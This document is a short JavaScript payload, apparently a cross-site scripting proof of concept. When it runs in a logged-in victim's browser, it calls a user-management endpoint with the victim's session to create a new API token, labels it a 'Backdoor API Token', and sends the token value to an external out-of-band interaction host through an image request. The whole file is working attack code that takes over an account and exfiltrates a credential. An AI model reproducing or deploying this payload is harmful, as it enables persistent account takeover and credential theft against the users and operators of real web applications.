(async function() {
    const EXFIL = 'https://oskpfdzzwhnbxxvl14la6o5shu7mqpary.oast.site';
    
    console.log('%c[SECURITY] Arbitrary JavaScript Execution on ' + document.domain, 'color: #ff0000; font-size: 16px; font-weight: bold;');
    
    try {
        const response = await fetch('/api/user_management/v1/api-tokens/create', {
            method: 'POST',
            credentials: 'include'
        });
        
        if (response.ok) {
            const token = await response.json();
            console.log('%c[SECURITY] Backdoor API Token Created: ' + token.tokenValue, 'color: #ff0000; font-size: 14px;');
            new Image().src = EXFIL + '?apiToken=' + token.tokenValue;
        }
    } catch(e) {}
})();
